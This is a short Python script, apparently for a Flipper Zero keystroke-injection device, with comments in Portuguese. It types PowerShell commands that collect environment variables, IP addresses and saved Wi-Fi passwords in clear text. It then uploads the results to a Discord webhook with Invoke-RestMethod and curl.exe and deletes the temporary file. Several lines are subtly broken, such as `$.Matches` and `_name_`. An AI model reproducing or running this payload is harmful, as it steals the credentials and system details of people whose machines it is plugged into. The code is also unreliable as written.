import flipperzero as fz
import time

def main():
    try:
        # Abre o PowerShell
        fz.keyboard.type("powershell")
        fz.keyboard.press(fz.Keycode.ENTER)
        time.sleep(1)

        # Define o URL do Webhook do Discord
        url = "YOUR_DISCORD_WEBHOOK_URL"

        # Lista todas as variáveis de ambiente e as salva em um arquivo stats.txt
        fz.keyboard.type("$env:tmp\\stats.txt = (Get-ChildItem env:) | Out-File $env:tmp\\stats.txt")
        fz.keyboard.press(fz.Keycode.ENTER)
        time.sleep(1)

        # Obtém todos os endereços IPv4 da rede e adiciona ao arquivo stats.txt
        fz.keyboard.type("Get-NetIPAddress -AddressFamily IPv4 | Select-Object IPAddress, SuffixOrigin | Where-Object IPAddress -notmatch '(127.0.0.1|169.254.\d+.\d+)' | Out-File $env:tmp\\stats.txt -Append")
        fz.keyboard.press(fz.Keycode.ENTER)
        time.sleep(1)

        # Obtém as redes Wi-Fi salvas e extrai os nomes e senhas das redes, adicionando ao arquivo stats.txt
        fz.keyboard.type("(netsh wlan show profiles) | Select-String '\:(.+)$' | ForEach-Object { $name=$.Matches.Groups[1].Value.Trim(); $ } | ForEach-Object { (netsh wlan show profile name="$name" key=clear) } | Select-String 'Key Content\W+\:(.+)$' | ForEach-Object { $pass=$.Matches.Groups[1].Value.Trim(); $ } | ForEach-Object { Add-Content -Path $env:tmp\\stats.txt -Value ('PROFILE_NAME: ' + $name + ', PASSWORD: ' + $pass) }")
        fz.keyboard.press(fz.Keycode.ENTER)
        time.sleep(1)

        # Cria um objeto JSON com o nome do computador e o conteúdo do arquivo stats.txt
        body_content = "$env:computername Stats from Ducky/Pico"

        # Envia o objeto JSON para o Webhook do Discord usando Invoke-RestMethod
        fz.keyboard.type(f"Invoke-RestMethod -ContentType 'Application/Json' -Uri '{url}' -Method Post -Body '{{ content = \"{body_content}\" }}'")
        fz.keyboard.press(fz.Keycode.ENTER)
        time.sleep(1)

        # Envia o arquivo stats.txt para o Webhook do Discord usando curl.exe
        fz.keyboard.type(f"curl.exe -F 'file1=@$env:tmp\\stats.txt' '{url}'")
        fz.keyboard.press(fz.Keycode.ENTER)
        time.sleep(1)

        # Remove o arquivo stats.txt
        fz.keyboard.type("Remove-Item $env:tmp\\stats.txt")
        fz.keyboard.press(fz.Keycode.ENTER)
        time.sleep(1)

        # Encerra o PowerShell
        fz.keyboard.type("exit")
        fz.keyboard.press(fz.Keycode.ENTER)
        time.sleep(1)

    finally:
        # Certifique-se de limpar os buffers e encerrar corretamente
        fz.cleanup()

if _name_ == "_main_":
    main()
